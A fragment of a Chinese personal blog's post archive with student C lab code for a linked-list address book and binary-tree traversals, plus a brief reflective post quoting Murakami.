L-&gt;next;</span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要修改的ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">int</span> select;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入需要修改的属性：（1.姓名 2.性别 3.电话 4.住址 5.分组）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;select);</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的姓名：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.name));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的性别：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.sex));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的电话：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.tele));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的住址：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.add));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">5</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的分组：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.group));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;更新成功！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中不存在该 ID！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//八、查找记录（根据ID）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Find_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p;</span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要查找的ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中不存在此人！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：%s\t&quot;</span>,p-&gt;data.ID);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>,p-&gt;data.name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：%s\t&quot;</span>,p-&gt;data.sex);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：%s\t&quot;</span>,p-&gt;data.tele);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：%s\t&quot;</span>,p-&gt;data.add);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：%s\t&quot;</span>,p-&gt;data.group);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//九、打印输出所有记录  遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Printall_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录是空的！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = L-&gt;next;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中的全部记录如下：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：%s\t&quot;</span>,p-&gt;data.ID);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>,p-&gt;data.name);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：%s\t&quot;</span>,p-&gt;data.sex);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：%s\t&quot;</span>,p-&gt;data.tele);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;住址：%s\t&quot;</span>,p-&gt;data.add);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：%s\t&quot;</span>,p-&gt;data.group);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//十、释放 链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Destroy_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p,*q;</span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        q = p;			<span class="comment">//使用 q 暂时存放当前结点</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(q);</span><br><span class="line">        q = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">free</span>(L);</span><br><span class="line">    L = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;释放成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//菜单界面</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t\t\t*********************简易通讯录*******************\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t\t1.初始化通讯录                          5.查找联系人\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t\t2.创建通讯录                      	6.插入联系人\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t\t3.删除联系人                      	7.遍历通讯录\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t\t4.修改联系人                      	8.释放通讯录\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t\t********************* 0 为退出 *******************\n&quot;</span>);</span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> select;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;使用说明：为了您的正常使用，请按照顺序进行操作！！！\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;首先请初始化；随后请创建通讯录！！！之后可进行 删除、修改、查找、插入、遍历等操作；最后请释放通讯录！！\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">		<span class="comment">//system(&quot;cls&quot;);</span></span><br><span class="line">        Menu();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请选择菜单：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;select);</span><br><span class="line">        <span class="keyword">switch</span>(select)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                &#123;</span><br><span class="line">					<span class="comment">//初始化</span></span><br><span class="line">                    Init_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                &#123;</span><br><span class="line">					<span class="comment">//创建通讯录</span></span><br><span class="line">                    <span class="keyword">int</span> num;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;请选择创建方式(1.前插法 2.尾插法)：&quot;</span>);</span><br><span class="line">                    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">1</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//前插法</span></span><br><span class="line">                        Creat_List_front();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">2</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//尾插法</span></span><br><span class="line">                        Creat_List_behind();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//删除记录</span></span><br><span class="line">                    Dele_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//修改记录</span></span><br><span class="line">                    Update_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//查找记录</span></span><br><span class="line">                    Find_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//插入记录</span></span><br><span class="line">                    <span class="keyword">int</span> num;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;请选择插入方式(1.前插法 2.尾插法)&quot;</span>);</span><br><span class="line">                    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">1</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//前插法</span></span><br><span class="line">                        Insert_List_front();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">2</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//尾插法</span></span><br><span class="line">                        Insert_List_behind();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//遍历</span></span><br><span class="line">                    Printall_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//释放</span></span><br><span class="line">                    Destroy_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/15/KdJ6nYGcFESbrhP.png" alt="image-20211015165430030"></p>
<p><img src="https://i.loli.net/2021/10/15/plQ1m5XRcCDOtHJ.png" alt="image-20211015165636809"></p>
<p><img src="https://i.loli.net/2021/10/15/6lhzZMNEI3XYrP9.png" alt="image-20211015165510697"></p>
<p><img src="https://i.loli.net/2021/10/15/Ubm6uEakfOZnTV3.png" alt="image-20211015165608348"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>数据结构第二次实验-二叉树的遍历（递归、非递归）</title>
    <url>/2021/11/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86%EF%BC%88%E9%80%92%E5%BD%92%E3%80%81%E9%9D%9E%E9%80%92%E5%BD%92%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://i.loli.net/2021/11/11/P5kz2rRZslSJpCy.png" alt="image-20211111231233214"></p>
<p><strong>头文件 <code>bintree.h</code></strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//二叉树的存储：链式存储（不带双亲）</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;					<span class="comment">//定义结点类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>   <span class="comment">//二叉树结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span> <span class="comment">//指向左右子树的指针</span></span><br><span class="line">&#125;bintnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> bintnode *bintree;</span><br><span class="line">bintree root;  <span class="comment">//根结点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//二叉树的创建：按照前序遍历的结果创建一颗 给定 二叉树</span></span><br><span class="line"><span class="function">bintree <span class="title">createbintree</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    bintree t;</span><br><span class="line">    <span class="keyword">if</span>((ch = getchar()) == <span class="string">&#x27;#&#x27;</span>) <span class="comment">//空子树</span></span><br><span class="line">        t = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        t = (bintnode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(bintnode));</span><br><span class="line">        t-&gt;data = ch;</span><br><span class="line">        t-&gt;lchild = createbintree();</span><br><span class="line">        t-&gt;rchild = createbintree();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注：输入时，必须按照 前序遍历 的顺序进行输入</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历算法------递归算法-----------------------------------</span></span><br><span class="line"><span class="comment">//前序遍历（根 左 右）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        preorder(t-&gt;lchild);</span><br><span class="line">        preorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//中序遍历（左 根 右）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        inorder(t-&gt;lchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        inorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//后序遍历（左 右 根）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        postorder(t-&gt;lchild);</span><br><span class="line">        postorder(t-&gt;rchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//-------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//顺序栈的定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">stack</span>&#123;</span></span><br><span class="line">    bintree data[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> tag[<span class="number">100</span>];		<span class="comment">//为栈中每个元素设置的标记，便于 后序遍历</span></span><br><span class="line">    <span class="keyword">int</span> top;			<span class="comment">//栈顶指针</span></span><br><span class="line">&#125;seqstack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(seqstack *s,bintree t)</span></span>&#123;</span><br><span class="line">    s-&gt;data[s-&gt;top] = t;</span><br><span class="line">    s-&gt;top++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//出栈</span></span><br><span class="line"><span class="function">bintree <span class="title">pop</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top != <span class="number">0</span>)&#123;  		<span class="comment">//判空</span></span><br><span class="line">        s-&gt;top--;</span><br><span class="line">        <span class="keyword">return</span>(s-&gt;data[s-&gt;top]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历算法------非递归算法-----------------------------------</span></span><br><span class="line"><span class="comment">//前序遍历（根 左 右）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder_1</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t) || (s.top!=<span class="number">0</span>))&#123;		<span class="comment">//当前处理的子树不为空栈 或 栈不为空 时</span></span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中序遍历（左 根 右）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder_1</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t!=<span class="literal">NULL</span>) || (s.top!=<span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//后序遍历（左 右 根）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder_1</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t) || (s.top!=<span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            s.data[s.top] = t;</span><br><span class="line">            s.tag[s.top] = <span class="number">0</span>;</span><br><span class="line">            s.top++;</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s.tag[s.top<span class="number">-1</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">            s.top--;</span><br><span class="line">            t = s.data[s.top];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            t = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = s.data[s.top<span class="number">-1</span>];</span><br><span class="line">            s.tag[s.top<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>源文件 <code>test.cpp</code></strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;bintree.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;---------------------菜单界面--------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; \t1.递归遍历             2.非递归遍历       \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------0.退出----------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> select;</span><br><span class="line">    bintree t;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请根据前序遍历结果输入二叉树的 结点值（空子树使用 # 代替）：\n&quot;</span>);</span><br><span class="line">	t = createbintree();</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		Menu();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;请输入菜单选项：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;select);</span><br><span class="line">		<span class="keyword">switch</span>(select)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:  <span class="comment">//递归遍历</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;前序遍历结果：&quot;</span>);</span><br><span class="line">				preorder(t);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;中序遍历结果：&quot;</span>);</span><br><span class="line">				inorder(t);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;后序遍历结果：&quot;</span>);</span><br><span class="line">				postorder(t);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:		<span class="comment">//递归遍历</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;前序遍历结果：&quot;</span>);</span><br><span class="line">				preorder(t);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;中序遍历结果：&quot;</span>);</span><br><span class="line">				inorder(t);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;后序遍历结果：&quot;</span>);</span><br><span class="line">				postorder(t);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;您输入的选项有误，请重新输入：\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/11/ieurZmqRlgCPcGt.png" alt="image-20211111233134578"></p>
<p>测试以上图 二叉树 为例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">前序遍历结果：abdefgc</span><br><span class="line">    输入：abd#<span class="meta">#ef##g##c##</span></span><br><span class="line">中序遍历结果：dbfegac</span><br><span class="line">后序遍历结果：dfgebca</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/13/IvMHoaLZWmV8TyN.png" alt="image-20211113085744734"></p>
<p><img src="https://i.loli.net/2021/11/13/8VzkgG5Pq32cKli.png" alt="image-20211113085800931"></p>
<p><img src="https://i.loli.net/2021/11/13/2mUsZEbpYzlMLHD.png" alt="image-20211113085816823"></p>
<p><img src="https://i.loli.net/2021/11/13/KWZMfnJghjyIqaD.png" alt="image-20211113085827862"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>查无此人</title>
    <url>/2021/10/01/%E6%9F%A5%E6%97%A0%E6%AD%A4%E4%BA%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>村上春树说</p>
<p>“你要记得那些黑暗中默默抱紧你的人，逗你笑的人，陪你彻夜聊天的人，坐车来看望你的人，带</p>
<p>着你四处游荡的人，说想念你的人。是这些人组成你生命中一点一滴的温暖，是这些温暖使你成</p>
<p>为善良的人。”</p>
<p>然后，在评论中我看到了，<br>，<br>，<br>查无此人。。。</p>
]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>树型结构</title>
    <url>/2021/10/30/%E6%A0%91%E5%9E%8B%E7%BB%93%E6%9E%84/</url>
